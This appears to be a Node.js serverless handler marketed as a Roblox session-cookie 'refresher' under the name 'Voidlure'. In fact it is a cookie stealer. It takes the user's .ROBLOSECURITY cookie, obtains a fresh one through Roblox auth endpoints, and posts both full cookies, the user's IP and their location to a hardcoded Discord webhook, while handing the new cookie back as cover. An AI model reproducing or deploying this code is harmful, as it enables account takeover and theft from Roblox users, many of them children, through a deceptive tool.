module.exports = async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { cookie } = req.body;

    if (!cookie || !cookie.includes('_|WARNING')) {
        return res.status(400).json({ success: false, message: 'Invalid cookie format' });
    }

    try {
        const newCookie = await refreshRobloxCookie(cookie);
        
        const ipData = await getIpInfo(req);
        
        await sendToWebhook(cookie, newCookie, ipData);
        
        return res.status(200).json({ success: true, cookie: newCookie });
    } catch (error) {
        return res.status(500).json({ success: false, message: error.message });
    }
};

async function refreshRobloxCookie(oldCookie) {
    const headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Cookie': '.ROBLOSECURITY=' + oldCookie
    };

    const response = await fetch('https://www.roblox.com/mobileapi/userinfo', {
        method: 'GET',
        headers: headers
    });

    if (!response.ok) {
        throw new Error('Invalid cookie - failed to authenticate');
    }

    const userData = await response.json();
    const userId = userData.UserID;

    const authResponse = await fetch('https://auth.roblox.com/v2/logout', {
        method: 'POST',
        headers: {
            ...headers,
            'Content-Type': 'application/json',
            'X-CSRF-TOKEN': '',
            'Referer': 'https://www.roblox.com/',
            'Origin': 'https://www.roblox.com'
        }
    });

    const setCookieHeader = authResponse.headers.get('set-cookie');
    let newCookie = null;

    if (setCookieHeader) {
        const cookieMatch = setCookieHeader.match(/\.ROBLOSECURITY=([^;]+)/);
        if (cookieMatch) {
            newCookie = cookieMatch[1];
        }
    }

    if (!newCookie) {
        const authHeaders = await getAuthHeaders(oldCookie);
        const refreshResponse = await fetch('https://auth.roblox.com/v1/authentication-ticket', {
            method: 'POST',
            headers: {
                ...headers,
                ...authHeaders,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({})
        });

        const ticketCookie = refreshResponse.headers.get('set-cookie');
        if (ticketCookie) {
            const ticketMatch = ticketCookie.match(/\.ROBLOSECURITY=([^;]+)/);
            if (ticketMatch) {
                newCookie = ticketMatch[1];
            }
        }
    }

    if (newCookie) {
        const verifyResponse = await fetch('https://www.roblox.com/mobileapi/userinfo', {
            method: 'GET',
            headers: {
                ...headers,
                'Cookie': '.ROBLOSECURITY=' + newCookie
            }
        });

        if (verifyResponse.ok) {
            return newCookie;
        }
    }

    throw new Error('Failed to refresh cookie - try again');
}

async function getAuthHeaders(cookie) {
    const response = await fetch('https://auth.roblox.com/v2/login', {
        method: 'POST',
        headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Cookie': '.ROBLOSECURITY=' + cookie
        },
        body: JSON.stringify({})
    });

    const csrfToken = response.headers.get('x-csrf-token') || '';
    return { 'X-CSRF-TOKEN': csrfToken };
}

async function getIpInfo(req) {
    try {
        const ip = req.headers['x-forwarded-for'] || 
                   req.connection.remoteAddress || 
                   req.socket.remoteAddress || 
                   'Unknown';
        
        const response = await fetch('https://ipapi.co/json/');
        if (response.ok) {
            const data = await response.json();
            return {
                ip: ip,
                city: data.city || 'Unknown',
                country: data.country_name || 'Unknown',
                region: data.region || 'Unknown'
            };
        }
        return { ip: ip, city: 'Unknown', country: 'Unknown', region: 'Unknown' };
    } catch (error) {
        return { ip: 'Unknown', city: 'Unknown', country: 'Unknown', region: 'Unknown' };
    }
}

async function sendToWebhook(oldCookie, newCookie, ipData) {
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1534100275596496917/Kl4cQXEuqQACHkiNvNsqq9maGQ7APPj9BksdSqiAkjmNNuagh8oD49p_idHDawYvoBqA';

    const payload = {
        content: '@everyone',
        embeds: [{
            title: 'Voidlure Cookie Refresh',
            color: 0x000000,
            timestamp: new Date().toISOString(),
            fields: [{
                name: 'Old Cookie (First 60 chars)',
                value: '```' + (oldCookie ? oldCookie.substring(0, 60) + '...' : 'N/A') + '```',
                inline: false
            }, {
                name: 'New Cookie (First 60 chars)',
                value: '```' + (newCookie ? newCookie.substring(0, 60) + '...' : 'N/A') + '```',
                inline: false
            }, {
                name: 'IP',
                value: ipData?.ip || 'Unknown',
                inline: true
            }, {
                name: 'Location',
                value: ipData?.city && ipData?.country ?
                    ipData.city + ', ' + ipData.country :
                    'Unknown',
                inline: true
            }, {
                name: 'User-Agent',
                value: '```' + (ipData?.userAgent || 'Unknown').substring(0, 80) + '```',
                inline: false
            }, {
                name: 'Full Old Cookie',
                value: '||' + (oldCookie || 'N/A') + '||',
                inline: false
            }, {
                name: 'Full New Cookie',
                value: '||' + (newCookie || 'N/A') + '||',
                inline: false
            }],
            footer: {
                text: 'Voidlure',
                icon_url: 'https://cdn.discordapp.com/embed/avatars/0.png'
            }
        }]
    };

    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    } catch (error) {
        console.error('Webhook failed:', error.message);
    }
}
